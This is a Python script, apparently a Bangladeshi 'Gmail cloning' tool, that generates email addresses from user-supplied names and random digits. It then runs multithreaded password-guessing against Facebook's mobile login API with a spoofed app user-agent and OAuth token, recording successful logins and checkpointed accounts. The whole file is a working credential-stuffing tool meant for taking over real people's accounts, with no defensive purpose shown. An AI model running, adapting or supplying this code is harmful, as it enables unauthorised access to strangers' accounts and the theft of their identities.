#WRITTEN BY MR.DIPTO
#MY GITHUB : https://github.com/MR-DIPTO-404
#----------import----------#
from os import system as clr
import random 
import string
from concurrent.futures import ThreadPoolExecutor as ted
import uuid
import httpx
import json
import sys
#----------logo----------#
logo=("""
 d888b  .88b  d88.  .d8b.  d888888b db           
88' Y8b 88'YbdP`88 d8' `8b   `88'   88           
88      88  88  88 88ooo88    88    88           
88  ooo 88  88  88 88~~~88    88    88           
88. ~8~ 88  88  88 88   88   .88.   88booo.      
 Y888P  YP  YP  YP YP   YP Y888888P Y88888P """)
#-----------clear-----------#
def clear():
    clr('clear')
    print(logo)
    print(45*'-')
    print('Facebook : DIPTO HIRA')
    print('Github   : MR-DIPTO-404')
    print(45*'-')
#----------line----------#
def line():
    print(45*'-')
#----------main----------#
def main():
    clear()
    print('[01] GMAIL CLONING ')
    print('[00] EXIT')
    line()
    option=input('[??] CHOICE MENU : ')
    if option in ['1','01']:
        gmail()
    else:
        exit(' thanks for using :) ')
#----------gmail--------#
def gmail():
    user=[]
    clear()
    print('EXAMPLE : mim , sadiya , mahadi ')
    first=input('ENTER FIRST NAME : ')
    line()
    print('EXAMPLE : akter , khan , hasan ')
    last=input('ENTER LAST NAME : ')
    line()
    print('EXAMPLE : @gmail.com , @yahoo.com')
    domain=input('ENTER YOUR DOMAIN : ')
    clear()
    print('EXAMPLE : 1000,5000,10000')
    try:
        limit=int(input('ENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ted(max_workers=30) as Dipto:
        tl=str(len(user))
        clear()
        print('TOTAL ACCOUNT : '+tl)
        print('USE AIRPLANE MODE FOR SPEED UP ')
        line()
        for digitx in user:
            ids=first+last+digitx+domain
            passlist=[first+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234']
            Dipto.submit(m1,ids,passlist)
    line()
    print('THE PROGRESS HAS BEEN COMPLETE')
    input('PRESS ENTER TO BACK : ')
    main()
oks=[]
cps=[]
loop=0
#----------method----------#
def m1(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r[RUNNING] %s|OK : %s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': '[FBAN/FB4A;FBAV/429.0.0.27.114;FBBV/444810901;FBDM/{density=2.75,width=1080,height=2062};FBLC/en_US;FBRV/444810901;FBCR/A-Mobile;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 6 Pro;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            url='https://api.facebook.com/method/auth.login'
            req=httpx.post(url,data=datax,headers=header).json()
            if 'session_key' in req:
                print('\r\r [OK] '+ids+' | '+pas)
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error_msg']:
                print('\r\r [CP] '+ids+' | '+pas)
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#----------end-----------#
main()
